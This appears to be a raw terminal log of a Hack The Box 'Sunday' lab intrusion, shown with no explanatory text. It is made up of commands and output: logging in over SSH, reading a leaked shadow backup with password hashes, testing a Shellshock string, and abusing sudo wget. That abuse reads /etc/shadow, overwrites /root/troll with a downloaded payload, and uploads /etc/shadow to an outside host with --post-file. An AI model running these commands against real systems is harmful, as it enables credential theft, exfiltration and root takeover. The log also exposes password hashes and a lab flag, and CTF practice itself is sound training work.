@@ -1,0 +1,524 @@
+┌─[root@parrot]─[~/hackthebox/sunday]   
+└──╼ #ssh sunny@10.10.10.76             
+ssh: connect to host 10.10.10.76 port 22: Connection refused                    
+┌─[✗]─[root@parrot]─[~/hackthebox/sunday]                                       
+└──╼ #ssh -p 22022 sunny@10.10.10.76    
+Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1                                     
+┌─[✗]─[root@parrot]─[~/hackthebox/sunday]                                       
+└──╼ #ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76                                                                                                    
+
+^C                                      
+┌─[✗]─[root@parrot]─[~/hackthebox/sunday]                                       
+└──╼ #ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+ssh: connect to host 10.10.10.76 port 22022: No route to host                   
+┌─[✗]─[root@parrot]─[~/hackthebox/sunday]                                       
+└──╼ #ping 10.10.10.76                  
+PING 10.10.10.76 (10.10.10.76) 56(84) bytes of data.                            
+64 bytes from 10.10.10.76: icmp_seq=1 ttl=254 time=293 ms                       
+64 bytes from 10.10.10.76: icmp_seq=2 ttl=254 time=539 ms                       
+^C                                      
+--- 10.10.10.76 ping statistics ---     
+3 packets transmitted, 2 received, 33.3333% packet loss, time 2002ms            
+rtt min/avg/max/mdev = 293.487/416.168/538.850/122.681 ms                       
+┌─[root@parrot]─[~/hackthebox/sunday]   
+└──╼ #ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+Password:                               
+Last login: Tue Dec 31 09:26:30 2019 from 10.10.14.14                           
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008           
+sunny@sunday:~$ ls                      
+Desktop  Documents  Downloads  local.cshrc  local.login  local.profile  Public  
+sunny@sunday:~$ cd Desktop              
+sunny@sunday:~/Desktop$ ls              
+addmoresoftware.desktop  opensolaris-next-steps.desktop  register-opensolaris.desktop               
+sunny@sunday:~/Desktop$ ls              
+addmoresoftware.desktop  opensolaris-next-steps.desktop  register-opensolaris.desktop               
+sunny@sunday:~/Desktop$ sudo -l         
+User sunny may run the following commands on this host:                         
+    (root) NOPASSWD: /root/troll        
+sunny@sunday:~/Desktop$ clear           
+sunny@sunday:~/Desktop$ export TERM=screen-256color                             
+sunny@sunday:~/Desktop$ clear           
+sunny@sunday:~/Desktop$                 
+sunny@sunday:~/Desktop$ ls /            
+backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var   
+bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr        
+sunny@sunday:~/Desktop$ cd backup       
+-bash: cd: backup: No such file or directory                                    
+sunny@sunday:~/Desktop$ cd /babckup     
+-bash: cd: /babckup: No such file or directory                                  
+sunny@sunday:~/Desktop$ cd /backup      
+sunny@sunday:/backup$ ls                
+agent22.backup  shadow.backup           
+sunny@sunday:/backup$ ls -la            
+total 5                                 
+drwxr-xr-x  2 root root   4 2018-04-15 20:44 .                                  
+drwxr-xr-x 26 root root  27 2018-04-24 12:57 ..                                 
+-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup                     
+-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup                      
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$ cat shadow.backup 
+mysql:NP:::::::                         
+openldap:*LK*:::::::                    
+webservd:*LK*:::::::                    
+postgres:NP:::::::                      
+svctag:*LK*:6445::::::                  
+nobody:*LK*:6445::::::                  
+noaccess:*LK*:6445::::::                
+nobody4:*LK*:6445::::::                 
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::        
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::       
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$                   
+sunny@sunday:/backup$ ls                
+agent22.backup  shadow.backup           
+sunny@sunday:/backup$ su - sammy        
+Password:                               
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008           
+sammy@sunday:~$                         
+sammy@sunday:~$ gyan = '() { :;}; echo Hello' bash -c:                          
+-bash: gyan: command not found          
+sammy@sunday:~$ gyan='() { :;}; echo Hello' bash -c:                            
+bash: -:: invalid option                
+Usage:  bash [GNU long option] [option] ...                                     
+        bash [GNU long option] [option] script-file ...                         
+GNU long options:                       
+        --debug                         
+        --debugger                      
+        --dump-po-strings               
+        --dump-strings                  
+        --help                          
+        --init-file                     
+        --login                         
+        --noediting                     
+        --noprofile                     
+        --norc                          
+        --posix                         
+        --protected                     
+        --rcfile                        
+        --restricted                    
+        --verbose                       
+        --version                       
+        --wordexp                       
+Shell options:                          
+        -irsD or -c command or -O shopt_option          (invocation only)       
+        -abefhkmnptuvxBCHP or -o option 
+sammy@sunday:~$ gyan='() { :;}; echo Hello' bash -c :                           
+Hello                                   
+sammy@sunday:~$ export TERM=screen-256color                                     
+sammy@sunday:~$                         
+sammy@sunday:~$ ls                      
+Desktop  Documents  Downloads  Public   
+sammy@sunday:~$ cd Desktop/             
+sammy@sunday:~/Desktop$ ls              
+user.txt                                
+sammy@sunday:~/Desktop$ cat user.txt    
+a3d9498027ca5187ba1793943ee8a598        
+sammy@sunday:~/Desktop$ ls -l           
+total 1                                 
+-r-------- 1 sammy staff 33 2018-04-15 20:37 user.txt                           
+sammy@sunday:~/Desktop$ cd ..           
+sammy@sunday:~$ ls -l                   
+total 6                                 
+drwxr-xr-x 2 sammy staff 4 2018-04-15 20:37 Desktop                             
+drwxr-xr-x 6 sammy staff 6 2018-04-15 20:15 Documents                           
+drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Downloads                           
+drwxr-xr-x 2 sammy staff 2 2018-04-15 20:15 Public                              
+sammy@sunday:~$ env                     
+MANPATH=/usr/gnu/share/man:/usr/share/man:/usr/X11/share/man                    
+HZ=                                     
+SHELL=/bin/bash                         
+TERM=screen-256color                    
+PAGER=/usr/bin/less -ins                
+MAIL=/var/mail/sammy                    
+PATH=/usr/gnu/bin:/usr/bin:/usr/X11/bin:/usr/sbin:/sbin                         
+PWD=/export/home/sammy                  
+LANG=en_US.UTF-8                        
+TZ=Asia/Kolkata                         
+SHLVL=1                                 
+HOME=/export/home/sammy                 
+LOGNAME=sammy                           
+_=/usr/gnu/bin/env                      
+OLDPWD=/export/home/sammy/Desktop       
+sammy@sunday:~$ sudo -l                 
+User sammy may run the following commands on this host:                         
+    (root) NOPASSWD: /usr/bin/wget      
+sammy@sunday:~$ get -h                  
+ERROR: Usage: get [-begkmLpst] [-l[p]] [-asequence] [-cdate-time] [-Gg-file] [-isid-list] [-rsid] [-xsid-list] file ... 
+sammy@sunday:~$ wget -h                 
+GNU Wget 1.10.2, a non-interactive network retriever.                           
+Usage: wget [OPTION]... [URL]...        
+
+Mandatory arguments to long options are mandatory for short options too.        
+
+Startup:                                
+  -V,  --version           display the version of Wget and exit.                
+  -h,  --help              print this help.                                     
+  -b,  --background        go to background after startup.                      
+  -e,  --execute=COMMAND   execute a `.wgetrc'-style command.                   
+
+Logging and input file:                 
+  -o,  --output-file=FILE    log messages to FILE.                              
+  -a,  --append-output=FILE  append messages to FILE.                           
+  -d,  --debug               print lots of debugging information.               
+  -q,  --quiet               quiet (no output).                                 
+  -v,  --verbose             be verbose (this is the default).                  
+  -nv, --no-verbose          turn off verboseness, without being quiet.         
+  -i,  --input-file=FILE     download URLs found in FILE.                       
+  -F,  --force-html          treat input file as HTML.                          
+  -B,  --base=URL            prepends URL to relative links in -F -i file.      
+
+Download:                               
+  -t,  --tries=NUMBER            set number of retries to NUMBER (0 unlimits).  
+       --retry-connrefused       retry even if connection is refused.           
+  -O,  --output-document=FILE    write documents to FILE.                       
+  -nc, --no-clobber              skip downloads that would download to          
+                                 existing files.                                
+  -c,  --continue                resume getting a partially-downloaded file.    
+       --progress=TYPE           select progress gauge type.                    
+  -N,  --timestamping            don't re-retrieve files unless newer than      
+                                 local. 
+  -S,  --server-response         print server response.                         
+       --spider                  don't download anything.                       
+  -T,  --timeout=SECONDS         set all timeout values to SECONDS.             
+       --dns-timeout=SECS        set the DNS lookup timeout to SECS.            
+       --connect-timeout=SECS    set the connect timeout to SECS.               
+       --read-timeout=SECS       set the read timeout to SECS.                  
+  -w,  --wait=SECONDS            wait SECONDS between retrievals.               
+       --waitretry=SECONDS       wait 1..SECONDS between retries of a retrieval.
+       --random-wait             wait from 0...2*WAIT secs between retrievals.  
+  -Y,  --proxy                   explicitly turn on proxy.                      
+       --no-proxy                explicitly turn off proxy.                     
+  -Q,  --quota=NUMBER            set retrieval quota to NUMBER.                 
+       --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.
+       --limit-rate=RATE         limit download rate to RATE.                   
+       --no-dns-cache            disable caching DNS lookups.                   
+       --restrict-file-names=OS  restrict chars in file names to ones OS allows.
+  -4,  --inet4-only              connect only to IPv4 addresses.                
+  -6,  --inet6-only              connect only to IPv6 addresses.                
+       --prefer-family=FAMILY    connect first to addresses of specified family,
+                                 one of IPv6, IPv4, or none.                    
+       --user=USER               set both ftp and http user to USER.            
+       --password=PASS           set both ftp and http password to PASS.        
+
+Directories:                            
+  -nd, --no-directories           don't create directories.                     
+  -x,  --force-directories        force creation of directories.                
+  -nH, --no-host-directories      don't create host directories.                
+       --protocol-directories     use protocol name in directories.             
+  -P,  --directory-prefix=PREFIX  save files to PREFIX/...                      
+       --cut-dirs=NUMBER          ignore NUMBER remote directory components.    
+
+HTTP options:                           
+       --http-user=USER        set http user to USER.                           
+       --http-password=PASS    set http password to PASS.                       
+       --no-cache              disallow server-cached data.                     
+  -E,  --html-extension        save HTML documents with `.html' extension.      
+       --ignore-length         ignore `Content-Length' header field.            
+       --header=STRING         insert STRING among the headers.                 
+       --proxy-user=USER       set USER as proxy username.                      
+       --proxy-password=PASS   set PASS as proxy password.                      
+       --referer=URL           include `Referer: URL' header in HTTP request.   
+       --save-headers          save the HTTP headers to file.                   
+  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.       
+       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).
+       --no-cookies            don't use cookies.                               
+       --load-cookies=FILE     load cookies from FILE before session.           
+       --save-cookies=FILE     save cookies to FILE after session.              
+       --keep-session-cookies  load and save session (non-permanent) cookies.   
+       --post-data=STRING      use the POST method; send STRING as the data.    
+       --post-file=FILE        use the POST method; send contents of FILE.      
+
+HTTPS (SSL/TLS) options:                
+       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,     
+                                SSLv3, and TLSv1.                               
+       --no-check-certificate   don't validate the server's certificate.        
+       --certificate=FILE       client certificate file.                        
+       --certificate-type=TYPE  client certificate type, PEM or DER.            
+       --private-key=FILE       private key file.                               
+       --private-key-type=TYPE  private key type, PEM or DER.                   
+       --ca-certificate=FILE    file with the bundle of CA's.                   
+       --ca-directory=DIR       directory where hash list of CA's is stored.    
+       --random-file=FILE       file with random data for seeding the SSL PRNG. 
+       --egd-file=FILE          file naming the EGD socket with random data.    
+
+FTP options:                            
+       --ftp-user=USER         set ftp user to USER.                            
+       --ftp-password=PASS     set ftp password to PASS.                        
+       --no-remove-listing     don't remove `.listing' files.                   
+       --no-glob               turn off FTP file name globbing.                 
+       --no-passive-ftp        disable the "passive" transfer mode.             
+       --retr-symlinks         when recursing, get linked-to files (not dir).   
+       --preserve-permissions  preserve remote file permissions.                
+
+Recursive download:                     
+  -r,  --recursive          specify recursive download.                         
+  -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).    
+       --delete-after       delete files locally after downloading them.        
+  -k,  --convert-links      make links in downloaded HTML point to local files. 
+  -K,  --backup-converted   before converting file X, back up as X.orig.        
+  -m,  --mirror             shortcut for -N -r -l inf --no-remove-listing.      
+  -p,  --page-requisites    get all images, etc. needed to display HTML page.   
+       --strict-comments    turn on strict (SGML) handling of HTML comments.    
+
+Recursive accept/reject:                
+  -A,  --accept=LIST               comma-separated list of accepted extensions. 
+  -R,  --reject=LIST               comma-separated list of rejected extensions. 
+  -D,  --domains=LIST              comma-separated list of accepted domains.    
+       --exclude-domains=LIST      comma-separated list of rejected domains.    
+       --follow-ftp                follow FTP links from HTML documents.        
+       --follow-tags=LIST          comma-separated list of followed HTML tags.  
+       --ignore-tags=LIST          comma-separated list of ignored HTML tags.   
+  -H,  --span-hosts                go to foreign hosts when recursive.          
+  -L,  --relative                  follow relative links only.                  
+  -I,  --include-directories=LIST  list of allowed directories.                 
+  -X,  --exclude-directories=LIST  list of excluded directories.                
+  -np, --no-parent                 don't ascend to the parent directory.        
+
+Mail bug reports and suggestions to <bug-wget@gnu.org>.                         
+sammy@sunday:~$ wget -i /etc/shadow     
+/etc/shadow: Permission denied          
+No URLs found in /etc/shadow.           
+sammy@sunday:~$ sudo wget -i /etc/shadow
+/etc/shadow: Invalid URL root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146::::::: Unsupported scheme   
+/etc/shadow: Invalid URL daemon:NP:6445::::::: Unsupported scheme               
+/etc/shadow: Invalid URL bin:NP:6445::::::: Unsupported scheme                  
+/etc/shadow: Invalid URL sys:NP:6445::::::: Unsupported scheme                  
+/etc/shadow: Invalid URL adm:NP:6445::::::: Unsupported scheme                  
+/etc/shadow: Invalid URL lp:NP:6445::::::: Unsupported scheme                   
+/etc/shadow: Invalid URL uucp:NP:6445::::::: Unsupported scheme                 
+/etc/shadow: Invalid URL nuucp:NP:6445::::::: Unsupported scheme                
+/etc/shadow: Invalid URL dladm:*LK*:::::::: Unsupported scheme                  
+/etc/shadow: Invalid URL smmsp:NP:6445::::::: Unsupported scheme                
+/etc/shadow: Invalid URL listen:*LK*:::::::: Unsupported scheme                 
+/etc/shadow: Invalid URL gdm:*LK*:::::::: Unsupported scheme                    
+/etc/shadow: Invalid URL zfssnap:NP:::::::: Unsupported scheme                  
+/etc/shadow: Invalid URL xvm:*LK*:6445::::::: Unsupported scheme                
+/etc/shadow: Invalid URL mysql:NP:::::::: Unsupported scheme                    
+/etc/shadow: Invalid URL openldap:*LK*:::::::: Unsupported scheme               
+/etc/shadow: Invalid URL webservd:*LK*:::::::: Unsupported scheme               
+/etc/shadow: Invalid URL postgres:NP:::::::: Unsupported scheme                 
+/etc/shadow: Invalid URL svctag:*LK*:6445::::::: Unsupported scheme             
+/etc/shadow: Invalid URL nobody:*LK*:6445::::::: Unsupported scheme             
+/etc/shadow: Invalid URL noaccess:*LK*:6445::::::: Unsupported scheme           
+/etc/shadow: Invalid URL nobody4:*LK*:6445::::::: Unsupported scheme            
+/etc/shadow: Invalid URL sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::: Unsupported scheme   
+/etc/shadow: Invalid URL sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::: Unsupported scheme  
+No URLs found in /etc/shadow.           
+sammy@sunday:~$ sudo wget -i /etc/shadow 2&>1 | awk '{print $4}'                
+
+                                        
+^C                  
+sammy@sunday:~$ sleep 5 ; sudo wget 10.10.14.14:8000/troll                      
+--14:07:09--  http://10.10.14.14:8000/troll                                     
+           => `troll'                   
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 22 [application/octet-stream]   
+
+100%[====================================>] 22            --.--K/s              
+
+14:07:11 (1.65 MB/s) - `troll' saved [22/22]                                    
+
+sammy@sunday:~$ sleep 5 ; sudo wget 10.10.14.14:8000/troll -O /root/troll       
+--14:07:59--  http://10.10.14.14:8000/troll                                     
+           => `/root/troll'             
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 22 [application/octet-stream]   
+
+100%[====================================>] 22            --.--K/s              
+
+14:08:00 (4.44 MB/s) - `/root/troll' saved [22/22]                              
+
+sammy@sunday:~$ wget -h                 
+GNU Wget 1.10.2, a non-interactive network retriever.                           
+Usage: wget [OPTION]... [URL]...        
+
+Mandatory arguments to long options are mandatory for short options too.        
+
+Startup:            
+  -V,  --version           display the version of Wget and exit.                
+  -h,  --help              print this help.                                     
+  -b,  --background        go to background after startup.                      
+  -e,  --execute=COMMAND   execute a `.wgetrc'-style command.                   
+
+Logging and input file:                 
+  -o,  --output-file=FILE    log messages to FILE.                              
+  -a,  --append-output=FILE  append messages to FILE.                           
+  -d,  --debug               print lots of debugging information.               
+  -q,  --quiet               quiet (no output).                                 
+  -v,  --verbose             be verbose (this is the default).                  
+  -nv, --no-verbose          turn off verboseness, without being quiet.         
+  -i,  --input-file=FILE     download URLs found in FILE.                       
+  -F,  --force-html          treat input file as HTML.                          
+  -B,  --base=URL            prepends URL to relative links in -F -i file.      
+
+Download:           
+  -t,  --tries=NUMBER            set number of retries to NUMBER (0 unlimits).  
+       --retry-connrefused       retry even if connection is refused.           
+  -O,  --output-document=FILE    write documents to FILE.                       
+  -nc, --no-clobber              skip downloads that would download to          
+                                 existing files.                                
+  -c,  --continue                resume getting a partially-downloaded file.    
+       --progress=TYPE           select progress gauge type.                    
+  -N,  --timestamping            don't re-retrieve files unless newer than      
+                                 local. 
+  -S,  --server-response         print server response.                         
+       --spider                  don't download anything.                       
+  -T,  --timeout=SECONDS         set all timeout values to SECONDS.             
+       --dns-timeout=SECS        set the DNS lookup timeout to SECS.            
+       --connect-timeout=SECS    set the connect timeout to SECS.               
+       --read-timeout=SECS       set the read timeout to SECS.                  
+  -w,  --wait=SECONDS            wait SECONDS between retrievals.               
+       --waitretry=SECONDS       wait 1..SECONDS between retries of a retrieval.
+       --random-wait             wait from 0...2*WAIT secs between retrievals.  
+  -Y,  --proxy                   explicitly turn on proxy.                      
+       --no-proxy                explicitly turn off proxy.                     
+  -Q,  --quota=NUMBER            set retrieval quota to NUMBER.                 
+       --bind-address=ADDRESS    bind to ADDRESS (hostname or IP) on local host.
+       --limit-rate=RATE         limit download rate to RATE.                   
+       --no-dns-cache            disable caching DNS lookups.                   
+       --restrict-file-names=OS  restrict chars in file names to ones OS allows.
+  -4,  --inet4-only              connect only to IPv4 addresses.                
+  -6,  --inet6-only              connect only to IPv6 addresses.                
+       --prefer-family=FAMILY    connect first to addresses of specified family,
+                                 one of IPv6, IPv4, or none.                    
+       --user=USER               set both ftp and http user to USER.            
+       --password=PASS           set both ftp and http password to PASS.        
+
+Directories:        
+  -nd, --no-directories           don't create directories.                     
+  -x,  --force-directories        force creation of directories.                
+  -nH, --no-host-directories      don't create host directories.                
+       --protocol-directories     use protocol name in directories.             
+  -P,  --directory-prefix=PREFIX  save files to PREFIX/...                      
+       --cut-dirs=NUMBER          ignore NUMBER remote directory components.    
+
+HTTP options:       
+       --http-user=USER        set http user to USER.                           
+       --http-password=PASS    set http password to PASS.                       
+       --no-cache              disallow server-cached data.                     
+  -E,  --html-extension        save HTML documents with `.html' extension.      
+       --ignore-length         ignore `Content-Length' header field.            
+       --header=STRING         insert STRING among the headers.                 
+       --proxy-user=USER       set USER as proxy username.                      
+       --proxy-password=PASS   set PASS as proxy password.                      
+       --referer=URL           include `Referer: URL' header in HTTP request.   
+       --save-headers          save the HTTP headers to file.                   
+  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.       
+       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).
+       --no-cookies            don't use cookies.                               
+       --load-cookies=FILE     load cookies from FILE before session.           
+       --save-cookies=FILE     save cookies to FILE after session.              
+       --keep-session-cookies  load and save session (non-permanent) cookies.   
+       --post-data=STRING      use the POST method; send STRING as the data.    
+       --post-file=FILE        use the POST method; send contents of FILE.      
+
+HTTPS (SSL/TLS) options:                
+       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,     
+                                SSLv3, and TLSv1.                               
+       --no-check-certificate   don't validate the server's certificate.        
+       --certificate=FILE       client certificate file.                        
+       --certificate-type=TYPE  client certificate type, PEM or DER.            
+       --private-key=FILE       private key file.                               
+       --private-key-type=TYPE  private key type, PEM or DER.                   
+       --ca-certificate=FILE    file with the bundle of CA's.                   
+       --ca-directory=DIR       directory where hash list of CA's is stored.    
+       --random-file=FILE       file with random data for seeding the SSL PRNG. 
+       --egd-file=FILE          file naming the EGD socket with random data.    
+
+FTP options:        
+       --ftp-user=USER         set ftp user to USER.                            
+       --ftp-password=PASS     set ftp password to PASS.                        
+       --no-remove-listing     don't remove `.listing' files.                   
+       --no-glob               turn off FTP file name globbing.                 
+       --no-passive-ftp        disable the "passive" transfer mode.             
+       --retr-symlinks         when recursing, get linked-to files (not dir).   
+       --preserve-permissions  preserve remote file permissions.                
+
+Recursive download: 
+  -r,  --recursive          specify recursive download.                         
+  -l,  --level=NUMBER       maximum recursion depth (inf or 0 for infinite).    
+       --delete-after       delete files locally after downloading them.        
+  -k,  --convert-links      make links in downloaded HTML point to local files. 
+  -K,  --backup-converted   before converting file X, back up as X.orig.        
+  -m,  --mirror             shortcut for -N -r -l inf --no-remove-listing.      
+  -p,  --page-requisites    get all images, etc. needed to display HTML page.   
+       --strict-comments    turn on strict (SGML) handling of HTML comments.    
+
+Recursive accept/reject:                
+  -A,  --accept=LIST               comma-separated list of accepted extensions. 
+  -R,  --reject=LIST               comma-separated list of rejected extensions. 
+  -D,  --domains=LIST              comma-separated list of accepted domains.    
+       --exclude-domains=LIST      comma-separated list of rejected domains.    
+       --follow-ftp                follow FTP links from HTML documents.        
+       --follow-tags=LIST          comma-separated list of followed HTML tags.  
+       --ignore-tags=LIST          comma-separated list of ignored HTML tags.   
+  -H,  --span-hosts                go to foreign hosts when recursive.          
+  -L,  --relative                  follow relative links only.                  
+  -I,  --include-directories=LIST  list of allowed directories.                 
+  -X,  --exclude-directories=LIST  list of excluded directories.                
+  -np, --no-parent                 don't ascend to the parent directory.        
+
+Mail bug reports and suggestions to <bug-wget@gnu.org>.                         
+sammy@sunday:~$ sudo wget --            
+wget: missing URL   
+Usage: wget [OPTION]... [URL]...        
+
+Try `wget --help' for more options.     
+sammy@sunday:~$ sudo wget --post-file=  
+wget: missing URL   
+Usage: wget [OPTION]... [URL]...        
+
+Try `wget --help' for more options.     
+sammy@sunday:~$ sudo wget --post-file=/etc/shadow 10.10.14.14:8001/upload.php filename=shadow       
+--14:58:10--  http://10.10.14.14:8001/upload.php                                
+           => `upload.php'              
+Connecting to 10.10.14.14:8001... connected.                                    
+HTTP request sent, awaiting response... 500 Internal Server Error               
+14:58:11 ERROR 500: Internal Server Error.                                      
+
+--14:58:11--  http://filename=shadow/   
+           => `index.html'              
+Resolving filename=shadow... failed: node name or service name not known.       
+
+FINISHED --14:58:36--                   
+Downloaded: 0 bytes in 0 files          
+sammy@sunday:~$ sudo wget --post-file=/etc/shadow 10.10.14.14:8001/upload.php filename=shadow       
+--15:01:57--  http://10.10.14.14:8001/upload.php                                
+           => `upload.php'              
+Connecting to 10.10.14.14:8001... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: unspecified [text/html]         
+
+    [ <=>                                 ] 0             --.--K/s              
+
+15:01:59 (0.00 B/s) - `upload.php' saved [0]                                    
+
+--15:01:59--  http://filename=shadow/   
+           => `index.html'              
+Resolving filename=shadow... failed: node name or service name not known.       
+
+FINISHED --15:02:24--                   
+Downloaded: 0 bytes in 1 files          
+sammy@sunday:~$ sudo wget --post-file=/etc/shadow 10.10.14.14:8001/upload.php filename=shadow       
+--15:06:23--  http://10.10.14.14:8001/upload.php                                
+           => `upload.php.1'            
+Connecting to 10.10.14.14:8001... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: unspecified [text/html]         
+
+    [ <=>                                 ] 0             --.--K/s              
+
+15:06:24 (0.00 B/s) - `upload.php.1' saved [0]                                  
+
+--15:06:24--  http://filename=shadow/   
+           => `index.html'              
+Resolving filename=shadow... failed: node name or service name not known.       
+
+FINISHED --15:06:49--                   
+Downloaded: 0 bytes in 1 files          
+sammy@sunday:~$     
